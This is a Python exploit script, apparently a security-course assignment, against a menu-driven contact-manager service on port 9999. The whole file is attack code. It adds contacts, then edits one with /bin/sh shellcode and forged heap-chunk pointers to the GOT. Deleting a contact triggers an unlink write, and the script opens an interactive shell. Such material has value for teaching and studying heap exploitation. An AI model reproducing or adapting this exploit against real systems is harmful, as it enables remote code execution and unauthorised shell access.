# python assign6payload3.py 192.168.147.179 9999
import socket
import sys
import time
import telnetlib
import struct

def readUntil(s, content, echo = True):
   x = ""
   while True:
      y = s.recv(1)
      if not y:
         return False
      x += y
      for v in content:
         if x.endswith(v):
            if echo:
               sys.stderr.write(x)
            return x

def ru(s, txt):
   return readUntil(s, [txt])

def interact(s):
   t = telnetlib.Telnet()                                                            
   t.sock = s                                                                        
   t.interact()

# Create a TCP/IP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

server_address = (sys.argv[1], 9999)
print("Connecting to %s port %s" % server_address)
sock.connect(server_address)
time.sleep(1)

#                  shellcode                                                                                                                                                                                                                                   
#payload = "A"*40 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x06\x04\x05\xcd\x80" + "A"*190 + struct.pack("<IIII", 0x804c118, 0, 0, 0x111) + "\n"
editTo = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x06\x04\x05\xcd\x80" + "B"*230 + struct.pack("<IIII", 0x804c228, 0x804c008, 0, 0x111) + "C"*256 + struct.pack("<II", 0x804af14, 0x804c118) + "\n"
payload = "AAAA\n"
#editTo = "A"*40 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x06\x04\x05\xcd\x80" + "A"*190 + struct.pack("<IIII", 0x804c118, 0, 0, 0x111) + "B"*256 + struct.pack("<IIII", 0x804c228, 0x804c008, 0, 0x111) + "C"*256 + struct.pack("<II", 0x804af14, 0x804c030) + "\n"
edit = "BBBB\n"
name2 = "BBBB\n"
name3 = "CCCC\n"
name4 = "DDDD\n"
delete = "CCCC\n"

#Contact 1
#receive initial prompt
ru(sock, "Quit\n")
#add first contact
sock.send("1\n")
#receive the response
ru(sock, "address)\n")
#send the name
sock.send(payload)

#Contact 2
#receive next prompt
ru(sock, "Quit\n")
#add second contact
sock.send("1\n")
#receive the response
ru(sock, "address)\n")
#send the name
sock.send(name2)

#Contact 3
#receive next prompt
ru(sock, "Quit\n")
#add third contact
sock.send("1\n")
#receive the response
ru(sock, "address)\n")
#send the name
sock.send(name3)

#Contact 4
#receive next prompt
ru(sock, "Quit\n")
#add third contact
sock.send("1\n")
#receive the response
ru(sock, "address)\n")
#send the name
sock.send(name4)

#Overwrite contact 1, 2 and 3 with edited pointers
#receive next prompt
ru(sock, "Quit\n")
#edit second contact
sock.send("2\n")
#receive the response
ru(sock, "edit\n")
#send name to edit
sock.send(edit)
#receive the response
ru(sock, "address)\n")
#send the payload
sock.send(editTo)

#Delete contact 3 to cause the unlink to happen
#receive next prompt
ru(sock, "Quit\n")
#remove a contact
sock.send("3\n")
#receive the response
ru(sock, "delete\n")
#send the name to remove
sock.send(delete)

ru(sock, "Quit\n")

interact(sock)






